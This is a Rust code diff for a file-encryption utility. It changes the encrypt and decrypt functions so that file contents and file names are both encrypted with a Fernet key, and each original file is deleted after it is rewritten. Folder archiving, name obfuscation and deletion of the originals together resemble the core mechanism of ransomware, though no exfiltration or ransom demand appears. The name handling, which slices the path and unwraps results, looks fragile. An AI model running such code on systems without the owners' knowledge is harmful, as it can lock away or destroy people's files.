@@ -6,6 +6,7 @@ use std::fs::metadata;
 use std::fs::File;
 use std::io::prelude::*;
 use std::io::{Error, ErrorKind};
+use std::str;
 use std::sync::mpsc;
 use std::thread;
 
@@ -73,12 +74,13 @@ pub fn tar_all_folders() -> Result<(), Error> {
 // This function will encrypt the a file using fernet key
 pub fn encrypt_file(fname: &str, key: &String) -> Result<(), Error> {
     match fs::read(&fname) {
-        Ok(content) => match File::create(&fname) {
+        Ok(content) => match File::create(encryption::encrypt_to_cipher(&key, &fname.as_bytes())) {
             Ok(mut file) => {
                 println!("Encrypting {}", &fname);
                 file.write(encryption::encrypt_to_cipher(&key, &*content).as_bytes())
                     .expect("Cannot write to file");
                 println!("Encrypted {}", &fname);
+                fs::remove_file(&fname)?;
             }
             Err(err) => {
                 return Err(err);
@@ -90,7 +92,7 @@ pub fn encrypt_file(fname: &str, key: &String) -> Result<(), Error> {
 }
 
 // This function will decrypt the file using a fernet key
-pub fn decrypt_file(fname: &str, key: &String) -> Result<(), Error> {
+pub fn decrypt_file(mut fname: &str, key: &String) -> Result<(), Error> {
     let mut file = match File::open(&fname) {
         Ok(file) => file,
         Err(err) => {
@@ -98,15 +100,19 @@ pub fn decrypt_file(fname: &str, key: &String) -> Result<(), Error> {
         }
     };
     let mut encrypted_content = String::new();
+    fname = &fname[2..];
+    let decrypted_file_name = encryption::decrypt_to_normal(&key, &fname.to_string()).unwrap();
+    let decrypted_file_name = str::from_utf8(&decrypted_file_name).unwrap();
     match file.read_to_string(&mut encrypted_content) {
         Ok(_) => match encryption::decrypt_to_normal(&key, &encrypted_content) {
-            Ok(decrypted_content) => match File::create(&fname) {
+            Ok(decrypted_content) => match File::create(decrypted_file_name) {
                 Ok(mut out_file) => {
                     println!("Decrypting {}", &fname);
                     out_file
                         .write(&*decrypted_content)
                         .expect("Cannot write to file");
                     println!("Decrypted {}", &fname);
+                    fs::remove_file(&fname)?;
                 }
                 Err(err) => {
                     return Err(err);
